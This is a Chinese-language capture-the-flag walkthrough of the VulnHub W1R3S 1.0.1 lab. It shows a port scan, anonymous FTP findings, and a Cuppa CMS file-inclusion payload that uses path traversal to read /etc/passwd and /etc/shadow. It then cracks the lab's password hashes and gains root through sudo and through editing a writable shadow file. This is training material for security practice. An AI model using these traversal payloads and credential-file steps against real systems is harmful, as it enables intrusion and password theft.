# W1R3S: 1.0.1

https://www.vulnhub.com/entry/w1r3s-101,220/

difficulty: Beginner/Intermediate

Finish Date：2024-4-10

## IP

192.168.10.155

## Scan

Open Port -> 21,22,80,3306

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.10.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07e35a5cc81865b05f6ef775c77e11e0 (RSA)
|   256 03ab9aed0c9b32264413adb0b096c31e (ECDSA)
|_  256 3d6dd24b46e8c9a349e09356222ee354 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
```

先看看 ftp 21 可以匿名登陆，看到有 3 个文件夹，分别是：content、docs、new-employees。

01.txt 中的内容：

```
New FTP Server For W1R3S.inc
```

02.txt 中的内容，下面那个应该是个 base64，解码看看是什么信息：

```
#
#
01ec2d8fc11c493b25029fb1f47f39ce                <-- 这个应该是个哈希，看看能不能找到明文
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==    <-- 解码后的值为：It is easy, but not that easy..
############################################

```

03.txt 中没有什么有用的信息。

employee-names.txt 中的内容，好像可以得到登陆系统的用户名：

```
Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources
```

worktodo.txt 中得到的内容，说这不是通向 root 的方法：

```
ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```

在看看 80 网站上有什么有用的信息，默认页面是一个 apache 的主页，没什么有用信息，用目录扫描工具进行扫描看看有什么，扫描到了 3 个子目录：/administrator、/javascript 、/wordpress。
熟悉的老演员 wordpress 又出现了，分别访问子目录，看看有什么信息。

-   /javascript 403 不能访问。
-   /10.11.1.116 发现重定向到了 https://localhost/wordpress/，应该是系统内部做了跳转设置，只能在本地访问。
-   /administrator 好像是个管理后台的初始化设置 Installation 页面，而且我们能配置一些重要信息。看配置页面的提示，是一个 Cuppa CMS。让我们设置数据库的名字为：test，数据库用户名为：root，密码为 root，网站管理员用户名为：admin，登陆密码为 admin，继续下一步。到最后一步提示数据库建立成功，但是 Administrator's user created No 不成功。

尝试搜索 Cuppa CMS 的 exp，发现存在文件包含漏洞，但是 exp 中是直接 get 访问 http://192.168.10.155/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd 时，显示的是一个空的框，没有任何内容，反复尝试了还是不行，估计是搭建网站的人改写了某些源代码，不接受 get 方式的请求，尝试换 POST 方式进行访问，看看是否能行。最终得到了我们想要的内容：

```
root:x:0:0:root:/root:/bin/bash
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
```

尝试一下看看能否远程包含我们的 php 后门代码，结果是不能包含，看看能否用包装器去读本地 php 文件 urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php，结果也读不了，估计是在 php 中配置了某些参数，关闭了相应的功能。

其他什么信息都没有发现，installation 页面也报错。没有其他思路，既然能读取 /etc/passwd，看看是否有权限读取 /etc/shadow。这里有重大发现：

```
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```

看到了这三个用户的哈希密码，使用 john 进行爆破，得到了 w1r3s 的密码：computer，使用其登陆 ssh，尝试找 root 提权点，上传 linpeas 直接枚举。

## flag

### 方式 1：

发现 sudo -l 时，用户具有全部命令执行权限：

```
Matching Defaults entries for w1r3s on W1R3S:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S:
    (ALL : ALL) ALL

```

所以直接可以切换到 root 用户，sudo su root 输入密码获得 root 权限。

### 方式 2：

发现 /etc/passwd 和 /etc/shadow 全局可写，所以直接修改/etc/shadow 中的 root 密码，su root 直接获得最高权限。

```
nano  /etc/shadow

修改root的哈希密码和w1r3s一样：$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.
```

su root 输入密码：computer

最终在/root 目录下获得了 flag：

```
root@W1R3S:~# cat flag.txt
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/

-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------

```

最后让我们看看源代码中是否是将 Get 方法改成了 Post，验证了我们的猜测：

```
<div id="content_alert_config" class="content_alert_config">
    <?php include "../components/table_manager/fields/config/".@$cuppa->POST("urlConfig"); ?>
</div>
```

上面的代码中加了文件路径前缀，所以 php://filter/convert.base64-encode/resource=../Configuration.php 这样就执行不出来。

同时查看 php.ini 看到配置参数已经 off，不能远程加载：

```
root@W1R3S:/var/www/html/administrator/alerts# cat /etc/php/7.0/apache2/php.ini |grep allow_url_include
allow_url_include = Off
root@W1R3S:/var/www/html/administrator/alerts# cat /etc/php/7.0/apache2/php.ini |grep allow_url_fopen
allow_url_fopen = On
```
